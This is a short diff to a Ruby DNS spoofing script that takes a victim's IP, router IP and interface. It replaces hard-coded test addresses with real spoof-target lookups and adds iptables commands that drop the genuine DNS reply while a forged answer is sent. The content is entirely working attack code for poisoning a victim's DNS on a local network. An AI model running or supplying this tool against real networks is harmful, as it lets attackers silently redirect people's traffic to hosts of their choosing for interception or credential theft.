@@ -23,7 +23,7 @@
 ##
 ##  OUTPUT: nil
 ##
-##	USAGE: ruby dnsspoof.rb -v [target_ip]
+##	USAGE: ruby dns_spoof.rb -v <victim's IP> -r [router IP] -i [interface]
 ##
 ##############################################################################################################
 
@@ -191,9 +191,7 @@ end
 def sendResponse(packet, domainName, spoof_ip)
 
   # Convert the IP address
-  tester = '192.168.0.8'
-  myIP = tester.split(".")
- # myIP = spoof_ip.split(".");
+  myIP = spoof_ip.split(".");
   myIP2 = [myIP[0].to_i, myIP[1].to_i, myIP[2].to_i, myIP[3].to_i].pack('c*')
 
   # Create the UDP packet
@@ -338,10 +336,11 @@ def sniff(iface)
 
     if $dnsQuery == '10'
       domain = get_info(packet)
-      #spoof_ip = check_spoof(domain)
-      spoof_ip = '1.1.1.1'
+      spoof_ip = check_spoof(domain)
       if !spoof_ip.nil?
+        `iptables -A FORWARD -m u32 -p udp --dport 53 --u32 "0&0x0022=`+ packet.payload[0,2] +`"-j DROP`
         sendResponse(packet, domain, spoof_ip)
+        `iptables -D FORWARD -m u32 -p udp --dport 53 --u32 "0&0x0022=`+ packet.payload[0,2] +`"-j DROP`
       end
 
     end
